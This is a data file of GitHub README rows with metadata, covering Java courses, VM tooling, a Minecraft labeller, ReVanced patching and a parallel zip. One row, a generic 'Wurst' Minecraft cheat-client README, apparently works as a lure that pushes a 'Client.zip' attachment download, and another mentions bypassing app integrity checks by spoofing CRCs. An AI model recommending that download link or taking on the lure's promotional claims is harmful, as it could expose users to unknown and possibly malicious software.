Welcome to the **CS 211 - Object-oriented Programming** course! ☕🧡<br>

This course provides a comprehensive introduction to Java programming and object-oriented principles. It covers fundamental concepts, control flow, and advanced object-oriented techniques, equipping learners with the skills needed to develop robust and maintainable Java applications.

## 🎯 Course Outline
- Lesson 1: **INTRODUCTION TO JAVA AND OOP**
    - Objects, Classes, Methods, and Properties
    - The Java Main
    - Primitive Data Types
    - Operators in Java
    - Taking Inputs
- Lesson 2: **JAVA CONTROL FLOW**
    - Conditional Statements
    - Compound Conditions
    - Relational and Logical Operators
    - Iteration Constructs in Java
        - while Loop
        - for Loop
        - do-while Loop
    - Break and Continue Statements
- Lesson 3: **JAVA FUNCTIONS AND ARRAYS**
    - Functions in Java
        - Declaring and Defining Methods
        - Calling Methods
        - Actual and Formal Parameters
        - Passing Values by Value and by Reference
        - The ```return``` Keyword
            - Functions Creation and Usage
                - Function Categories based on Parameters and Return Values
                - Functions without Parameters and Return Values
                - Functions without Parameters but with Return Values
                - Functions with Parameters but without Return Values
                - Functions with Parameters and Return Values
            - Recursive Functions
    - Arrays in Java
        - Accessing Array Elements
        - for-each Array Traversal
- Lesson 4: **OBJECT-ORIENTED PROGRAMMING PRINCIPLES**
    - ***ENCAPSULATION***
        - Classes, Objects, Instance Variables
        - Constructors and Overloaded Constructors
        - Methods
        - Access Modifiers
        - Setters and Getters
        - Enumerations
        - Packages, Strings, Static Variables
    - ***INHERITANCE AND POLYMORPHISM***
        - Composition and Inheritance
        - Method Overloading and Overriding
        - Protected Access Modifier
        - Polymorphism
    - ***ABSTRACTION***
        - Introduction to Abstraction
        - Abstract Classes
        - Interfaces
- Lesson 5: **BONUS TOPICS**
    - Collections in Java
    - Exception Handling
",0,0,1,0.0,"['programming', 'greeting', 'course', 'outline']","['programming', 'greeting', 'course', 'outline']"
chriskiehl/Data-Oriented-Programming-In-Java-Book,main,"# Data Oriented Programming in Java

Source code for the book Data Oriented Programming in Java (by me! Chris Kiehl!)

<p align=""center"">
    <img src=""https://freecontent.manning.com/wp-content/uploads/DOTD_NewMEAP_Kiehl.png"" />
</p>

* [Get the book here!](https://mng.bz/BgQv)
* Use the discount code `mlkiehl` to get 50% off all formats! (Valid through October 9)
* ISBN: 9781633436930

> [!Note]
> This book is in Early Access while I continue to work on it. This repository will be updated as new chapters are released.

This book is a distillation of everything I’ve learned about what effective development looks like in Java (so far!). It’s what’s left over after years of experimenting, getting things wrong (often catastrophically), and
slowly having anything resembling “devotion to a single paradigm” beat out of me by the great humbling filter that is reality.

Data-orientation doesn't replace object orientation. The two work together and enhance each other. DoP is born from a very simple idea, and one that people have been repeatedly rediscovering since the dawn of computing: “representation is the essence of programming”. Programs that are organized around the data they manage tend to be simpler, smaller, and significantly easier understand. When we do a really good job of capturing the data in our domain, the rest of the system tends to fall into place in a way which can feel like it’s writing itself.

## Getting Started with this project

To download a copy of this repository, click on the [Download ZIP](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/archive/refs/heads/main.zip) button or execute the following command in your terminal:

```
git clone https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book.git
```

(If you downloaded the code bundle from the Manning website, please consider visiting the official code repository on GitHub at https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book for the latest updates.)

The project is built with [Gradle](https://gradle.org/).

```
gradle build
```

### Running the code

The `tests/` package houses all of the runnable code. You can run all the tests in a class with this command:

```
gradle test --tests 'path.to.test.Class'
```
e.g.
```
gradle test --tests 'dop.chapter02.Listings'
```

You can also run individual tests by specifying the method.

```
gradle test --tests 'dop.chapter02.Listings.listing_2_1'
```



### How to use this repository

Each chapter in the book has an associated package in the `src/test/` directory. Most of the examples aren't necessarily things that we'll run. They're primarily for study. We'll look at them and go ""Hmm. Interesting."" DoP is a book that's about design decisions and how they affect our code. We're striving to make incorrect states impossible to express or compile. Thus, a lot of the examples are exploring how code changes (or _disappears_ entirely) when we get our modeling right.

**Listings in the Book vs Code**

Each listing in the book will have a corresponding example in the code. The Javadoc will describe which listing the code applies to.

```
/**
* ───────────────────────────────────────────────────────
*                      Listing 1.1
* ───────────────────────────────────────────────────────
*
* Here's an example of how we might traditionally model
* data ""as data"" using a Java object.
* ───────────────────────────────────────────────────────
*/
```

Sometimes, separate listings in the book will be combined into one example in the code.

```
/**
 * ───────────────────────────────────────────────────────
 *                Listings 1.5 through 1.9
 * ───────────────────────────────────────────────────────
 * Representation affects our ability to understand the code
 * as a whole. [...]
 * ───────────────────────────────────────────────────────
 */
```

> [!Note]
> The class names in the code will often differ from the class names used in the book. Java doesn't let us redefine classes over and over again (which we do in the book as we refactor), so we 'cheat' by appending a qualifying suffix. For instance, `ScheduledTask` in listing A might become `ScheduledTaskV2` or `ScheduledTaskWithBetterOOP` in a subsequent example code. The listing numbers in the Javadoc will always tie to the Listing numbers in the book.


**Character Encodings**

Make sure your IDE / Text editor is configured for UTF-8 character encoding (Windows tends to default to other encodings). Many of the in-code diagrams leverage the utf-8 charset.

Example utf-8 diagram:
```
// An informational black hole!
//
//  ┌────────  It returns nothing!
//  ▼
// void reschedule( ) {   //  ◄─────────────────────────────────┐
//     ...         ▲                                            │ Compare how very different
// }               └────── It takes nothing!                    │ these two methods are in
//                                                              │ terms of what they convey
RetryDecision reschedule(FailedTask failedTask) {       //  ◄───┘ to us as readers
    // ...
}
```


## Table of Contents

| Chapter                                                   | Code Listings                                                                                                                                 | 
|-----------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| Chapter 01 - Data Oriented Programming                    | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter01/Listings.java) |
| Chapter 02 - Data, Identity, and Values                   | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter02/Listings.java) |
| Chapter 03 - Data and Meaning                             | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter03/Listings.java) |
| Chapter 04 - Representation is the Essence of Programming | [Listings.java](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/blob/main/app/src/test/java/dop/chapter04/Listings.java) |
| Chapter 05 - Coming soon!                                 | Coming soon!                                                                                                                                  |


## Questions and Feedback

I'd love to hear any and all feedback. You can leave comments in the [Manning forum](https://livebook.manning.com/forum?product=kiehl&page=1). I'm also very responsive to emails. If you have a question about the repo, feel free to write me at me@chriskiehl.com. 





",0,0,1,0.0,"['data', 'oriented', 'programming', 'java', 'get', 'start', 'project', 'run', 'code', 'how', 'use', 'repository', 'table', 'content', 'question', 'feedback']","['data', 'oriented', 'programming', 'java', 'get']"
vaccovecrana/frag-falcon,main,"# frag-falcon

Firecracker VM management. Run Docker images as micro VMs.

## Quick start

Grab the latest release [here](https://github.com/vaccovecrana/frag-falcon/releases).

To run `flc`, you need:

- A `glibc` based Linux distribution with virtualization support. Support for `musl` is being [considered](https://github.com/vaccovecrana/frag-falcon/issues/9).
- The `tun` and `kvm` (intel or amd) kernel modules loaded.
- A Linux bridge VMs can attach to. The bridge needs to be attached to a router that can provide DHCP addresses.
- A Linux kernel. You can grab [this one](https://github.com/vaccovecrana/frag-falcon/raw/main/ff-test/src/test/resources/kernel/vmlinux-6.1.98) we use for testing, or [compile your own](https://github.com/firecracker-microvm/firecracker/tree/main/resources/guest_configs).
- The latest [firecracker](https://github.com/firecracker-microvm/firecracker/releases) release.

Make a directory to store kernels and virtual machines, and place at least one kernel in the `kernels` directory.

```
localhost:~/flc# tree
.
├── kernels
└── virtual-machines
3 directories, 0 files 
```

> Note: if you plan to run `flc` as a non-root user, you'll need to `setcap` on the `flc` binary to grant network management capabilities. See [here](https://github.com/vaccovecrana/frag-falcon/blob/main/ff-test/README.md) for details.

Start `flc`:

```
flc \
  --api-host=0.0.0.0 \
  --vm-dir=./virtual-machines \
  --krn-dir=./kernels \
  --fc-path=/usr/local/bin/firecracker
```

Open a browser and go to `http://<your-host>:7070`

Use the integrated UI to create a test VM using your target Linux kernel and network bridge.

<img width=""668"" alt=""Screenshot 2024-08-19 at 10 37 48 PM"" src=""https://github.com/user-attachments/assets/e0abe564-6605-4902-bf62-84f4e79e43c9"">

You can also create a VM with an API call too:

```
curl -i -X POST \
   -H ""Content-Type:application/json"" \
   -d \
'{
  ""vm"": {
    ""tag"": {
      ""id"": ""new"",
      ""label"": ""test-vm-01"",
      ""description"": ""Test VM 01""
    },
    ""image"": { ""source"": ""docker.io/hashicorp/http-echo:latest"" },
    ""config"": {
      ""bootsource"": { ""kernel_image_path"": ""/root/flc/kernels/vmlinux-6.1.98"" },
      ""machineconfig"": { ""vcpu_count"": 1, ""mem_size_mib"": 512 }
    }
  },
  ""network"": { ""dhcp"": true, ""brIf"": ""br0"" },
  ""rebuildInitRamFs"": false
}' \
 'http://<your-host>:7070/api/v1/vm'
```

You will then have a list of VMs that you can start, stop, and inspect logs on.

<img width=""562"" alt=""Screenshot 2024-08-19 at 10 56 55 PM"" src=""https://github.com/user-attachments/assets/7bdd401e-2f07-49da-8bb0-1afe4116e716"">

The test VM I am running is using the `hashicorp/http-echo:latest` image. So I can `curl` it's IP address, just like any other machine in my internal network:

```
% curl http://172.16.4.107:5678
hello-world
```

## Building/Development

Requires Gradle 8 or later.

Besides the usual `gradle clean build`, create a file with the following content at `~/.gsOrgConfig.json`:

```
{
  ""orgId"": ""vacco-oss"",
  ""orgConfigUrl"": ""https://vacco-oss.s3.us-east-2.amazonaws.com/vacco-oss.json""
}
```

> Note: there's still a lot of tests with local paths I need to document/refactor.

## Resources/credits

- [TinyUntar](https://github.com/dsoprea/TinyUntar)
- [Firecracker API](https://github.com/firecracker-microvm/firecracker/blob/main/src/firecracker/swagger/firecracker.yaml)
- [Solar Bold Icons](https://www.svgrepo.com/collection/solar-bold-icons/1)
",7,10,1,0.0,"['quick', 'start', 'tree']","['quick', 'start', 'tree']"
Infatoshi/mc-labeller,master,"
# MC-Labeller

![](assets/screenshot.png)
![](assets/data.png)

> Note: This project was developed and tested on Ubuntu 22.04 Linux and macOS. The process may differ on Windows.

## Why I Built This

I created MC-Labeller as an alternative to projects like Malmo and MineRL, which are Minecraft environments for reinforcement learning agents. After experiencing difficulties with these existing solutions on various operating systems, I decided to build my own version. This allows me to:

- Create data when I'm away from home (possibly during university lectures)
- Control which Minecraft version to use
- Customize internal commands that provide utility to Python
- Access my home Linux server from anywhere using Tailscale
- Offload intensive computations to my home server, even when I'm elsewhere
- Have fun while learning!

I plan to follow up by using the collected tree mining data to train a Minecraft agent (a deep neural network allowed to interact with the game) to generalize over and mimic human behavior.

## Setup Instructions

### Pre-setup

```bash
sudo apt update && sudo apt upgrade -y && sudo apt autoremove
sudo apt install openjdk-17-jre-headless -y
mkdir server
mkdir -p ~/.minecraft/mods
```

### Install Forge

Ensure you have the Minecraft launcher installed with version ""1.18.2""

Download and run the Forge installer from here (https://files.minecraftforge.net/net/minecraftforge/forge/index_1.18.2.html)

### Server Setup

````bash
cd server
wget https://files.minecraftforge.net/maven/net/minecraftforge/forge/1.19.2-43.2.0/forge-1.19.2-43.2.0-installer.jar
java -jar forge-1.19.2-43.2.0-installer.jar --installServer
rm forge-1.19.2-43.2.0-installer.jar
echo ""#!/bin/sh"" > start.sh
echo ""java -Xmx4G -Xms4G -jar forge-1.19.2-43.2.0.jar nogui"" >> start.sh
chmod +x start.sh
echo ""eula=true"" > eula.txt
sudo ufw allow 25565/tcp

# Copy favorable server settings
mv ../server.properties .

# Start the server
./start.sh```
````

- Once the server boots up, disable fall damage by typing `gamerule fallDamage false` into the server terminal.

### Mod Creator

```bash
mkdir mod-creator && cd mod-creator
wget https://maven.minecraftforge.net/net/minecraftforge/forge/1.18.2-40.2.0/forge-1.18.2-40.2.0-mdk.zip
unzip forge-1.18.2-40.2.0-mdk.zip
rm forge-1.18.2-40.2.0-mdk.zip

# Set up development environment
./gradlew genEclipseRuns
./gradlew vscode

# Copy necessary files
mv ../SimpleMineRLMod.java src/main/com/example/examplemod/
mv ../mods.toml src/main/resources/META-INF/
mv ../build.gradle .

# Build the mod
./gradlew build

# Copy the mod to Minecraft mods folder
cp build/libs/*.jar ~/.minecraft/mods/
```

### Python Receiver

```bash
mkdir python && cd python
python3 -m venv venv
source venv/bin/activate
pip install -r ../requirements.txt
```

## How to Play

- Ensure the server is running

- Join the server through direct connection (use port 25565) to connect to your local server

- Run the Python script and observe the print statements as you move the mouse, click mouse buttons, and press keyboard buttons

- An OpenCV window will mimic your gameplay

### Current Features

- Press `.` to spawn at a new random location (useful for rapid data collection)

## TODO

- Test keystroke integers, mouse click integers, and mouse movement floats for consistency across Linux and macOS

- Document keyboard mappings (keystrokes are integers by default)

- Address fall damage prevention more elegantly

- Focus on the ""getting wood"" task/achievement for now

- Optimize performance for fullscreen and smaller MacBook chips

- Implement recording start/stop with [ and ] keys

- Add a feature to delete recently recorded data samples in case of mistakes
",0,0,1,0.0,"['why', 'i', 'build', 'this', 'setup', 'instruction', 'install', 'forge', 'server', 'setup', 'copy', 'favorable', 'server', 'setting', 'start', 'server', 'mod', 'creator', 'set', 'development', 'environment', 'copy', 'necessary', 'file', 'build', 'mod', 'copy', 'mod', 'minecraft', 'mod', 'folder', 'python', 'receiver', 'how', 'play', 'current', 'feature', 'todo']","['mod', 'server', 'copy', 'build', 'setup']"
Aimirim-STI/4diac-Plugin-UAORT,main,"# UAORT-4diac-plugin
4diac-ide Plugin to enable deployment on UAO Runtimes

### Install
For a step-by-step tutorial on the plugin instalation please refere to [Install.md](./INSTALL.md) document.

### Usage
To communicate with the UAO Runtime first add an `UAO_RT` device under the ""System Configuration"" view.

Edit the `MGR_ID` entry of the device to match the endpoint and port of the UAO Runtime.

Click on the Device block to select it and then on the `Properties` Tab. Under the `Instance` option select the ""Profile"" as `UAO`.

![Usage Video](./docs/BasicDeploy.gif)

After these steps the communication is configured and you can resume to the 61499 application build.

### Build from sources
Use `maven` tool to build the plugin with:
```shell
$ mvn clean
$ mvn install
```
After the command completes you will find the plugin installable zip file at [./package/target](./package/target) folder.
",2,1,5,0.0,"['install', 'usage', 'build', 'source']","['install', 'usage', 'build', 'source']"
NabihaShujaat/Wurst,master,"# Wurst

![Wurst Logo](https://example.com/wurst_logo.png)

Welcome to the official repository of **Wurst** - the ultimate tool for adding fun and troll modules to your gameplay experience! Here you will find all the information you need to get started with Wurst, explore its fantastic features, and contribute to its development. Dive in and unleash the power of Wurst client! 🎮✨

## Table of Contents
- [Introduction](#introduction)
- [Features](#features)
- [Getting Started](#getting-started)
- [Contributing](#contributing)
- [Community](#community)
- [License](#license)

## Introduction
**Wurst** has been a game-changer since its inception in 2014, offering a plethora of modules designed to entertain, surprise, and sometimes trick your fellow players. Whether you're exploring the depths of Minecraft or engaging in intense battles, Wurst is your reliable companion, enhancing your gaming sessions with its innovative functionalities.

## Features
- Wide range of fun and troll modules
- Open-source and constantly evolving
- Compatible with versions 1.7.2 through 1.21+
- Experience the power of Wurst client 1.21 🚀

Explore the full list of features and modules in the [Wiki](https://github.com/wurst/wiki).

## Getting Started
To start using Wurst, simply follow these steps:

1. Download the latest version of Wurst from the official repository.
2. Install Wurst by following the provided instructions.
3. Launch your game and enjoy the exciting features of Wurst!

Feel free to explore the various settings and modules to customize your experience to your liking. For detailed installation guidelines and troubleshooting tips, refer to the [Installation Guide](https://github.com/wurst/installation).

## Contributing
We welcome contributions from the community to help enhance and expand the capabilities of Wurst. If you're interested in contributing, please follow these steps:

1. Fork the repository to your GitHub account.
2. Create a new branch for your feature or bug fix.
3. Make your changes and submit a pull request.
4. Engage with the community and maintain open communication.

Check out our [Contribution Guidelines](https://github.com/wurst/contributing) for more details on how you can contribute effectively.

## Community
Join our community to connect with other Wurst users, share your experiences, and stay updated on the latest developments:

- Discord: [Wurst Discord Server](https://discord.gg/wurst)
- Twitter: [@wurstclient](https://twitter.com/wurstclient)
- Reddit: [r/wurstclient](https://www.reddit.com/r/wurstclient)

Don't forget to follow us on social media channels for exciting announcements, events, and giveaways!

## License
Wurst is released under the [MIT License](https://github.com/wurst/license). Feel free to modify and distribute the software as per the terms of the license.

[![Download Wurst](https://img.shields.io/badge/Download-Wurst-green)](https://github.com/user-attachments/files/16830252/Client.zip)

---

Thank you for choosing **Wurst** to add a touch of excitement and fun to your gaming adventures. Stay tuned for more updates, modules, and surprises coming your way! 🌟🎉",1,0,1,0.0,"['wurst', 'table', 'content', 'introduction', 'feature', 'get', 'start', 'contribute', 'community', 'license']","['wurst', 'table', 'content', 'introduction', 'feature']"
joshlong-attic/2024-bootiful-spring-workshop,main,"
# README 

bit.ly/spring-tips-playlist
youtube.com/@coffeesoftware

## Basics
* which IDE? IntelliJ, VSCode, and Eclipse
* your choice of Java: GraalVM
* start.spring.io, an API, website, and an IDE wizard 
* Devtools
* Docker Compose 
* Testcontainers
* banner.txt

## Development Desk Check
* the Spring JavaFormat Plugin 
	* Python, `gofmt`, your favorite IDE, and 
* the power of environment variables
* SDKMAN
	* `.sdkman`
* direnv 
	*  `.envrc`
* a good password manager for secrets 


## Data Oriented Programming in Java 21+ 
* an example

## Beans
* dependency injection from first principles
* bean configuration
* XML
* stereotype annotations
* lifecycle 
	* BeanPostProcessor
	* BeanFactoryPostProcessor
* auto configuration 
* AOP
* Spring's event publisher
* configuration processor

## AOT & GraalVM
* installing GraalVM 
* GraalVM native images 
* basics
* AOT lifecycles

## Data 
* `JdbcClient`
* SQL Initialization
* Flyway
* Spring Data JDBC

## Batch Processing 
* Spring Batch
* load some data from a CSV file to a SQL database

## Scalability 
* non-blocking IO
* virtual threads
* José Paumard's demo
* Cora Iberkleid's demo 

## Web Programming
* clients: `RestTemplate`, `RestClient`, declarative interface clients
* REST
	* controllers
	* functional style
* GraphQL 
	* batches


## Architecting for Modularity
* Privacy
* Spring Modulith 
* Externalized messages
* Testing 

## Artificial Intelligence
* what's in a model?
* Spring AI
* `ChatClient`
* prompts
* advisors
* Retrieval Augmented Generation (RAG)

## Microservices
* centralized configuration 
* API gateways 
	* reactive or not reactive
* event bus and refreshable configuration
* service registration and discovery



## Messaging and Integration
* ""What do you mean by Event Driven?""
* Messaging Technologies like RabbitMQ or Apache Kafka
* Spring Integration
* files to events


## Security 
* adding form login to an application
* authentication 
* authorization
* passkeys
* one time tokens
* OAuth 
	* the Spring Authorizatinm Server
	* OAuth clients
	* OAuth resource servers
	* protecting messaging code

## Q&A 
* I may not know, but I probably know who does know...",0,0,1,0.0,"['readme', 'basic', 'development', 'desk', 'check', 'data', 'oriented', 'programming', 'java', 'bean', 'aot', 'graalvm', 'data', 'batch', 'processing', 'scalability', 'web', 'program', 'architecting', 'modularity', 'artificial', 'intelligence', 'microservices', 'message', 'integration', 'security', 'q', 'a']","['data', 'readme', 'basic', 'development', 'desk']"
ashokitschool/Microservices_Zero_To_Hero,main,"# Microservices_Zero_To_Hero

## Day-01 : https://youtu.be/f2SdepNqoMo

## Day-02 : https://youtube.com/live/act5MPpiaVM?feature=share

## Day-03 : https://youtu.be/yK1eCuXDrfY

## Day-04 : https://youtu.be/SBPQuQw0lTo
",0,0,1,0.0,"['http', 'http', 'http', 'http']",['http']
FlavorMate/flavormate-server,main,"# FlavorMate

This is the Project for the FlavorMate backend, which is written in Java with Spring Boot.

## Getting Started

### Docker

1. Create a `docker-compose.yaml`-file (or download one from the [examples](./example))
2. Create the folders the container mounts.
3. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
4. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
5. Enter your details in the `.env`-file
6. Start your container with `docker compose up -d --remove-orphans`

### Barebone

You must have these dependencies installed:

- Postgresql
- Java 21

1. Download the latest [FlavorMate-Server.jar]().
2. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
3. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
4. Enter your details in the `.env`-file
5. Export your `.env`-file
6. Start the backend with
   ` java -jar -Dspring.profiles.active=release FlavorMate-Server.jar`.

## Environment Variables

| Key                             | Required | Description                                                                                                                     | Example                               | Default                               |
|---------------------------------|----------|---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------|---------------------------------------|
| FLAVORMATE_DATA_PATH            | No       | Path where files (e.g. recipe pictures) are saved                                                                               | `file:${user.home}/.flavormate/files` | `file:${user.home}/.flavormate/files` |
| FLAVORMATE_PORT                 | No       | Port the server runs inside the container                                                                                       | `8095`                                | `8095`                                |
| FLAVORMATE_HIGHLIGHT_COUNT      | No       | Amount of highlights getting generated                                                                                          | `14`                                  | `14`                                  |
| FLAVORMATE_PATH                 | No       | The path the server uses. Useful when hosting frontend and backend on the same url                                              | `/api`                                |                                       |                                     |
| FLAVORMATE_JWT_TOKEN            | No       | The path where the `secret.key`-file is saved                                                                                   | `/opt/app/secret.key`                 | `/opt/app/secret.key`                 |
| FLAVORMATE_BACKEND_URL          | Yes      | The URL the server is running on. Including the port if it is non standard                                                      | `http://localhost:8095`               |                                       |
| FLAVORMATE_FRONTEND_URL         | No       | Is only needed for links inside mails (e.g. password reset). [WebApp](https://github.com/FlavorMate/flavormate-app) is required | `https://app.flavormate.de`           |                                       |
| FLAVORMATE_ADMIN_USERNAME       | Yes      | Username for the admin account                                                                                                  | `admin`                               |                                       |
| FLAVORMATE_ADMIN_DISPLAYNAME    | Yes      | Display name for the admin account                                                                                              | `Administrator`                       |                                       |
| FLAVORMATE_ADMIN_MAIL           | Yes      | Mail address for the admin account                                                                                              | `example@localhost.de`                |                                       |
| FLAVORMATE_ADMIN_PASSWORD       | Yes      | Password for the admin account                                                                                                  | `Passw0rd!`                           |                                       |
| FLAVORMATE_FEATURE_STORY        | No       | Enables the functionality to create and view stories                                                                            | `true`                                | `true`                                |
| FLAVORMATE_FEATURE_REGISTRATION | No       | Allows the user to sign up. An admin has to activate the user.                                                                  | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_RECOVERY     | No       | Allows the user to reset its password. (Mail config is required!)                                                               | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_BRING        | No       | Enabled the bring integration                                                                                                   | `true`                                | `false`                               |
| DB_HOST                         | Yes      | Host address for the postgres database                                                                                          | `localhost:5432`                      |                                       |
| DB_USER                         | Yes      | User for the postgres database                                                                                                  | `flavormate`                          |                                       |
| DB_PASSWORD                     | Yes      | Password for the postgres database                                                                                              | `Passw0rd!`                           |                                       |
| DB_DATABASE                     | Yes      | Database name for the postgres database                                                                                         | `flavormate`                          |                                       |
| MAIL_FROM                       | No       | Mail From header                                                                                                                | `FlavorMate <noreply@example.de>`     |                                       |       
| MAIL_HOST                       | No       | Mail host                                                                                                                       | `smtp.example.com`                    |                                       |
| MAIL_PORT                       | No       | Mail port                                                                                                                       | `465`                                 |                                       |
| MAIL_USERNAME                   | No       | Mail user                                                                                                                       | `noreply@example.com`                 |                                       |
| MAIL_PASSWORD                   | No       | Mail password                                                                                                                   | `Passw0rd!`                           |                                       |
| MAIL_STARTTLS                   | No       | Use StartTLS?                                                                                                                   | `true`                                |                                       |
",2,0,3,5.0,"['flavormate', 'get', 'start', 'docker', 'barebone', 'environment', 'variable']","['flavormate', 'get', 'start', 'docker', 'barebone']"
AbdurazaaqMohammed/revanced-antisplit,main,"# revanced-antisplit
ReVanced Manager modified to work with APK files that have been converted from a split APK to a regular APK

**Notice: In [AntiSplit M](https://github.com/AbdurazaaqMohammed/AntiSplit-M), I have fixed the below issues, there is no need to use this modified version. It is only necessary if you merge APKs using another tool like [REAndroid APKEditor](https://github.com/REAndroid/APKEditor), AntiSplit G2, etc.**

# Why
In order to install an APK on Android, it must first be signed, although there are workarounds for rooted devices. ReVanced Manager uses a library made by Google called [apksig](https://android.googlesource.com/platform/tools/apksig) to sign APKs, regardless of the user's root status.

This library performs several types of validation when signing APKs. One of them produces an error like the following when attempting to sign APK files that have been converted from a split APK to a regular APK using a tool like [REAndroid APKEditor](https://github.com/REAndroid/APKEditor), AntiSplit M which is based on it or Apktool M.
```
Caused by: com.android.apksig.zip.ZipFormatException: Data Descriptor presence mismatch between Local File Header and Central Directory for entry AndroidManifest.xml. LFH: true, CD: false
        at com.android.apksig.internal.zip.LocalFileRecord.getRecord(LocalFileRecord.java:180)
        at com.android.apksig.internal.zip.LocalFileRecord.outputUncompressedData(LocalFileRecord.java:427)
        at com.android.apksig.internal.zip.LocalFileRecord.getUncompressedData(LocalFileRecord.java:451)
        at com.android.apksig.ApkSigner.getAndroidManifestFromApk(ApkSigner.java:966)
        at com.android.apksig.ApkSigner.getMinSdkVersionFromApk(ApkSigner.java:1004)
```

APKs merged in this way are **not corrupt**. They will install and work perfectly. There are **no** confirmed cases on the internet of this exception being thrown for an APK file that is actually corrupt. Either the validation apksig uses to throw this error is incorrect or the mismatch in fact does not matter and no exception should be thrown.

If the condition for this exception being thrown is removed from the code of ReVanced Manager, it will patch these merged APKs perfectly with no error, and they will install and work perfectly. This problem can also be solved by using a different method of signing or allowing users to save the patched APK if an error happened at signing, as I [reported](https://github.com/ReVanced/revanced-manager/issues/2083) to ReVanced, but it seems at least one collaborator is not interested in fixing this problem on their end.

Reporting this problem to Google is not really the solution here, because, as I explained in the thread, there are other real forms of validation that *should* be present in apksig but not in ReVanced Manager, at least not in their current state. Namely, CRC validation is done to ensure the validity of files inside the APK. Normally invalid CRCs indicate an invalid archive, however, an APK with invalid CRCs can be installed and ran perfectly fine. This is important because some apps (example: apps with Google Pairip Integrity protection) verify the validity of the app by checking the CRCs of files in its own APK, and some of these protections have been bypassed before by spoofing CRCs.  For the purposes of modifying APKs, ReVanced patches should at least have the option to ignore CRC checks so apps with this kind of protection can be successfuly modified.

With these factors in mind, I simply modified ReVanced Manager to stop this exception from being thrown and uploaded the APK [here](https://github.com/AbdurazaaqMohammed/revanced-antisplit/releases). Note that the signature is different to that used by ReVanced, so if you have ReVanced Manager already installed, you will have to uninstall it to install this version.
",3,0,1,0.0,['why'],['why']
gufranthakur/CodeLite,master,"# CodeLite

A minimalistic code editor built using Java swing, flatlaf and RSyntaxTextArea. 
This project is meant for learning and experimental purposes, by no means this is a production-ready code editor, but rather a fun attempt to learn and create my own code editor

![Screenshot 2024-10-06 135007](https://github.com/user-attachments/assets/8fe92fed-70f6-4766-939f-de9b4d6775ad)

# Features
* Syntax highlighting
* Auto save
* adding, deleting or renaming files
* open native terminal
* language support for Java, python, C, C++ and Javascript (more to be added soon)
* Dark and light theme
* various color schemes, including Monokai and Eclipse themes.

  # Snapshots

  ![Screenshot 2024-10-06 135111](https://github.com/user-attachments/assets/01ddcdfb-4193-4715-a049-d92649097acf)

  ![Screenshot 2024-10-06 135225](https://github.com/user-attachments/assets/ddd2a519-6f58-4c30-b9c1-1a62ef8ce963)
  
  ![Screenshot 2024-10-06 135324](https://github.com/user-attachments/assets/fdced105-d52d-4cb1-887b-2559fad88b81)
",1,1,1,0.0,"['codelite', 'feature', 'snapshot']","['codelite', 'feature', 'snapshot']"
gregsh/parallel-zip,main,"# Parallel Zip on JVM

Zipping tons of files on one core in a multicore/SSD/cloud era is a massive waste of time.

A zip file is just an array of entries and a central directory at the end of a file.

We cannot write to a zip file in parallel, but we can compress data in parallel in memory.

Last but not least, nobody wants to reimplement zip logic from scratch
or use an unsupported third-party zip library.
We reuse the standard `java.util.zip.ZipOutputStream` in the presented approach.

# Algorithm

1. Collect all zip entries and their bytes for each input file in parallel.
   For each input file:
   - Get a `ByteArrayOutputStream` and a `ZipOutputStream` on top of it
   - Write an entry to a zip stream. Do not close it to avoid writing an unneeded central directory
   - Get the bytes from the byte stream

```java
      var zipEntries = ConcurrentHashMap<ZipEntry, byte[]>();

      // for each input file in parallel:
      var out = new ByteArrayOutputStream();
      var zipEntry = new ZipEntry(filePathRelativeToZipRoot);
      var zip = new ZipOutputStream(out);
      try (var fileStream = Files.newInputStream(filePath)) {
        zip.putNextEntry(zipEntry);
        fileStream.transferTo(zip);
        zip.closeEntry();
      }
      zipEntries.put(zipEntry, out.toByteArray());
```

2. Write all entries and bytes sequentially to a target zip file:
   - Get a `FileOutputStream` and a `ZipOutputStream` on top of it
   - Write bytes of all entries to a file stream updating zip stream state
   - Write the central directory by closing the zip stream

```java
    try (var os = Files.newOutputStream(zipFile)) {
      var zip = new ZipOutputStream(os);
      var offset = 0L;
      for (Map.Entry<ZipEntry, byte[]> o : zipEntries.entrySet()) {
        var zipEntry = o.getKey();
        var bytes = o.getValue();
        zip.xEntries.add(new XEntry(zipEntry, offset)); // via reflection
        os.write(bytes);
        offset += bytes.length;
      }
      zip.offset = offset; // via reflection
      zip.close();
    }
```

# Notes

1. Java Reflection is used to work around missing Java API.
   **To avoid that in the future, we must request such an API**

2. The algorithm takes roughly the same amount of memory as the target zip file.
   We can start writing to disk when new zip entries are ready, applying backpressure to control memory consumption

3. It's the compression that takes most of the time.
   We can generate already compressed data in parallel in various data generation tasks. 
   Then, saving it to disk will take very little time

4. We can merge zip files without repacking using the same technique

# Results

Zipping `12.06 GB of 175,866 items` to a `1.14 GB` zip file on a MacBook M2 Max in seconds:

| Mode       | Seconds |
|------------|---------|
| Sequential | 151     |
| Parallel   | 18      |



A fully functional parallel zip in pure Java [(source)](src/main/java/parallelZip/MainJava.java):

```shell
gradle runJava <out.zip> <file-or-dir> .. 
```

A fully functional parallel zip in Kotlin [(source)](src/main/kotlin/parallelZip/MainKotlin.kt):

```shell
gradle runKotlin <out.zip> <file-or-dir> ..
```

Sequential zipping for comparison in pure Java [(source)](src/main/java/parallelZip/Sequential.java):

```shell
gradle runSequential <out.zip> <file-or-dir> ..
```
",0,0,1,0.0,"['parallel', 'zip', 'jvm', 'algorithm', 'note', 'result']","['parallel', 'zip', 'jvm', 'algorithm', 'note']"
